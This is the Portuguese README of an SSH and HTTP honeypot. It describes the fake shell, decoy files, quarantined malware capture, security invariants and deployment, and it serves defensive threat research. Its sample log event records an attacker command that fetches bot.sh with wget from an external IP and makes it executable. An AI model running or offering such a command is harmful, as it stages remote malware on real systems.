# Arapuca

Um honeypot SSH e HTTP de média interação em C++20. Ele roda num endereço
público, deixa atacantes entrarem com credenciais fracas, registra tudo o que
eles fazem, captura o que tentam baixar, e manda tudo para o New Relic, onde
os dashboards e alertas são provisionados como código.

**Ele nunca executa nada que o atacante envia.** Toda resposta do shell é
fabricada ou lida de um sistema de arquivos em memória, e o CI quebra o build
se qualquer primitiva de criação de processo aparecer no código fonte.

[Read in English](README.md)

---

## O que ele faz

**Um servidor SSH falso** que aceita apenas credenciais de uma lista das
fracas que atacantes reais tentam, e registra cada tentativa, tendo ela
funcionado ou não. A sessão que entra cai num shell falso com mais de quarenta
comandos sobre um sistema de arquivos fabricado: um servidor Ubuntu meio
abandonado, com usuários plausíveis, uma aplicação em produção e credenciais
que valem a pena roubar.

**Um servidor HTTP falso** com um painel de administração genérico nos quinze
caminhos que os scanners realmente pedem, e arquivos isca em `/.env`,
`/.git/config`, `/backup.sql`, `/wp-config.php` e outros. O que o atacante
levar desses arquivos é fabricado e não abre nada.

**Captura de malware.** Quando o atacante digita `wget` ou `curl` no shell
falso, a URL é buscada numa thread separada, com timeouts rígidos, limite de
tamanho, e uma política de endereço que recusa faixas privadas e o serviço de
metadados da nuvem. A amostra vai para quarentena como `<sha256>.zip`,
cifrada, somente leitura, nunca executada, e só o hash dela é consultado no
VirusTotal.

**Enriquecimento.** GeoIP, mapeamento MITRE ATT&CK a partir de regras em YAML,
e um classificador que decide se a sessão é bot ou provável humano pelo ritmo
da digitação.

## Arquitetura

```mermaid
flowchart TB
    A["Atacante"]

    subgraph VPS["Instância Oracle Cloud Always Free"]
        subgraph C["Container: sem root, read-only, sem capabilities"]
            SSH["Honeypot SSH<br/>libssh, porta 2222"]
            HTTP["Honeypot HTTP<br/>cpp-httplib, porta 8080"]
            SHELL["Shell falso<br/>sistema de arquivos virtual<br/>40+ comandos"]
            CAP["Worker de captura<br/>download isolado<br/>quarentena"]
            ENR["Enriquecimento<br/>GeoIP, ATT&CK<br/>classificador"]
            BUS["Bus de eventos limitado"]
            SINK["events.jsonl<br/>um objeto JSON por linha"]
        end
        NRA["New Relic<br/>Infrastructure Agent"]
        LR["logrotate"]
    end

    VT["VirusTotal<br/>só consulta de hash"]
    NR["New Relic<br/>logs, dashboards, alertas"]
    GH["GitHub Actions<br/>NerdGraph"]
    OUT["iocs/ e reports/"]

    A -->|"porta 22"| SSH
    A -->|"porta 80"| HTTP
    SSH --> SHELL
    SHELL -.->|"URL vista, nunca baixada aqui"| CAP
    CAP -->|"só o sha256"| VT
    SSH --> BUS
    HTTP --> BUS
    CAP --> BUS
    BUS --> ENR --> SINK
    SINK --> NRA --> NR
    SINK --> LR
    NR --> GH --> OUT
```

## Invariantes de segurança

Estas são propriedades que o projeto sustenta, não intenções. Cada uma tem
teste, e várias são garantidas pela estrutura do código, não por revisão.

| | Invariante | Como se sustenta |
|---|---|---|
| S1 | Entrada do atacante nunca é executada | Nenhum `system`, `exec*`, `popen`, `fork` ou `wordexp` em `src/` ou `include/`. Uma checagem no CI quebra o build se aparecer |
| S2 | Todo buffer controlado pelo atacante tem limite | Todos os limites num único cabeçalho, aplicados antes de alocar. Com fuzzing |
| S3 | Amostras nunca são executáveis | Gravadas com modo `0400`, e o volume da quarentena é `noexec` |
| S4 | Amostras nunca são enviadas | O cliente do VirusTotal não tem função de upload, e não dá para adicionar uma sem mudar a interface |
| S5 | O processo não é privilegiado | uid 10001, portas altas, e o host mapeia a 22 e a 80 nelas |
| S6 | O sshd real sai da porta 22 antes dela ser exposta | O cloud-init move no primeiro boot, o Ansible se recusa a rodar se ainda estiver lá, e o Terraform mantém a 22 fechada até o container subir |
| S7 | Segredos nunca chegam ao repositório | Só variáveis de ambiente, com `.env.example` e uma checagem no CI contra endereço público commitado |
| S8 | O atacante não consegue encher o disco | Teto de bytes e de arquivos na quarentena, com remoção do mais antigo, mais logrotate |
| S9 | O honeypot não pode ser apontado para endereços internos ou de metadados | O endereço resolvido é checado imediatamente antes de cada conexão, e em cada redirecionamento |
| S10 | Nenhum canal alcança algo real | Encaminhamento de porta, X11, agent forwarding e todo subsistema, inclusive SFTP, são recusados e registrados |

## Rodando localmente

Ubuntu 24.04, ou qualquer coisa com as mesmas bibliotecas. É a única base
suportada, no CI, no container e na VPS.

```bash
sudo apt-get install -y --no-install-recommends \
    build-essential cmake ninja-build pkg-config \
    libssl-dev libcurl4-openssl-dev \
    libssh-dev libyaml-cpp-dev libmaxminddb-dev libminizip-dev

cmake --preset dev
cmake --build --preset dev
ctest --preset dev

./build/dev/src/arapucad --config config/arapuca.dev.yaml
```

A configuração de desenvolvimento mantém tudo que é escrito dentro de `./var`
e usa portas não privilegiadas, então não precisa preparar nada e a limpeza é
apagar essa pasta.

Depois, de outro terminal:

```bash
ssh -p 2222 root@127.0.0.1            # senha 123456
curl http://127.0.0.1:8080/.env
tail -f var/events.jsonl | jq .
```

## Fazendo o deploy

```bash
# 1. Rede e instância. As portas 22 e 80 ficam fechadas.
cd deploy/terraform/oci
cp terraform.tfvars.example terraform.tfvars   # preencha
terraform init && terraform apply

# 2. Endurece o host e sobe o honeypot.
terraform output -raw ansible_inventory > ../../ansible/inventory/hosts.yml
cd ../../ansible
ansible-galaxy collection install -r requirements.yml
ansible-playbook -i inventory/hosts.yml site.yml \
  -e newrelic_license_key="$NEW_RELIC_LICENSE_KEY" \
  -e virustotal_api_key="$VT_API_KEY"

# 3. Só agora abre as portas do honeypot.
cd ../terraform/oci
terraform apply -var expose_honeypot_ports=true

# 4. Dashboards e alertas.
cd ../newrelic
terraform init && terraform apply -var "api_key=$NEW_RELIC_API_KEY"
```

O passo 3 é separado de propósito. Abrir a porta 22 antes do honeypot estar
escutando exporia o sshd real, e o playbook do Ansible se recusa a rodar se
detectar que ele ainda está lá.

O `docs/DEPLOYMENT.md` tem os modos de falha, inclusive como diagnosticar uma
instância que você não consegue alcançar.

## Saída

Um objeto JSON por linha, documentado campo a campo em
[`docs/EVENT_SCHEMA.md`](docs/EVENT_SCHEMA.md):

```json
{"schema_version":1,"event_type":"ssh.command","timestamp":"2026-11-02T14:31:07.482Z",
 "service":"ssh","sensor":"arapuca-sa","src_ip":"203.0.113.45","session_id":"01JBQ3...",
 "geo":{"country_iso":"CN","country":"China","asn":37963,"as_org":"Alibaba"},
 "mitre":{"technique_id":"T1105","technique":"Ingress Tool Transfer",
          "tactic":"Command and Control"},
 "command":"cd /tmp; wget http://198.51.100.9/bot.sh; chmod +x bot.sh",
 "seq":4,"since_prev_ms":11,"unknown":false}
```

### Dashboards

<!-- Os prints entram aqui quando o sensor tiver coletado uma semana
     representativa. Placeholders em vez de imagens inventadas: um dashboard
     com números fabricados representaria mal o que o projeto produz. -->

| | |
|---|---|
| ![Dashboard de visão geral](docs/images/dashboard-overview.png) | ![Dashboard de sessões](docs/images/dashboard-sessions.png) |
| _Visão geral: tráfego, geografia, credenciais, técnicas ATT&CK_ | _Sessões: transcrições, ritmo de digitação, classificação_ |

### Mapa ao vivo

A pasta [`web/`](web/) é uma página pública que mostra de onde vêm os ataques,
publicada no Netlify. Ela existe para o honeypot poder ser compartilhado com
quem não tem conta no New Relic, e para quem ler sobre ele poder tentar entrar
e ver o próprio país aparecer.

A chave do New Relic nunca chega ao navegador. Um job agendado roda o
`tools/live_export.py`, commita o `web/data/live.json`, e o Netlify publica
nesse push, então a chave vive só nos secrets do GitHub.

O que a página publica é deliberadamente mais grosso que o feed de IoCs: os
endereços de origem aparecem com a parte de host mascarada, porque o atacante
precisa reconhecer a própria tentativa enquanto quem divide um endereço
compartilhado não é nomeado.

### Feed de IoCs

A pasta [`iocs/`](iocs/) é regerada diariamente e a [`reports/`](reports/)
semanalmente, ambas a partir da telemetria do próprio sensor. Leia as
ressalvas em [`iocs/README.md`](iocs/README.md) antes de usar os endereços
para qualquer coisa: são observações com data, não uma lista de bloqueio.

## Organização do projeto

```
include/arapuca/  src/        cabeçalhos públicos e implementação
  core/                       configuração, eventos, bus, sink JSONL, limites
  enrich/                     GeoIP, mapeamento ATT&CK, classificador
  ssh/                        servidor libssh, shell falso, filesystem virtual
  http/                       painel admin, iscas, registro de requisições
  capture/                    política de endereço, download, quarentena, VirusTotal
config/                       credenciais, filesystem, regras ATT&CK, iscas
deploy/                       Dockerfile, compose, cloud-init, Terraform, Ansible
tools/                        exportação NerdGraph e geração de relatório
tests/                        unitários, integração e alvos de fuzzing
docs/                         schema de eventos, deploy, dependências
```

## Critérios de qualidade

Para rodar localmente tudo que o CI roda:

```bash
./scripts/verify.sh          # formatação, os dois tipos de build, sanitizers, clang-tidy
./scripts/verify.sh quick    # formatação, build debug e testes
```

O build release não é opcional. O GCC habilita análises sob otimização que
não consegue fazer com `-O0`, e um aviso que só aparece em release chegou ao
CI uma vez porque o portão local só construía o preset de debug.

Toda mudança passa por: GCC e Clang em x86_64 e arm64, AddressSanitizer e
UndefinedBehaviorSanitizer com detecção de vazamento, clang-tidy com zero
achados e perfil voltado a segurança, clang-format, oito alvos libFuzzer por
sessenta segundos cada, uma checagem de que nenhuma primitiva de criação de
processo existe, e uma checagem de que nenhum endereço público foi commitado.

Os testes de integração usam um cliente SSH real e um cliente HTTP real contra
servidores reais, porque uma política de canal pode estar certa no teste
unitário e errada no fio.

## Aviso legal e ético

A Arapuca registra apenas o que é enviado voluntariamente por quem se conecta
a ela. Ela não ataca nada, não varre nada e não revida nada.

Antes de rodar uma:

* **Rode numa infraestrutura que seja sua.** Um honeypot na rede dos outros é
  problema dos outros.
* **Entenda a legislação local** sobre gravar conexões e sobre publicar o que
  você gravou. Dados de endereço podem ser dado pessoal onde você mora.
* **A quarentena guarda malware de verdade.** Trate aquele diretório de
  acordo, e não copie amostra para uma máquina de que você gosta.
* **Os indicadores publicados nomeiam endereços reais.** Endereços são
  reaproveitados, e o CGNAT faz um endereço representar milhares de pessoas.
  São evidência para correlacionar, não lista de bloqueio.

## Licença

MIT, veja [LICENSE](LICENSE).
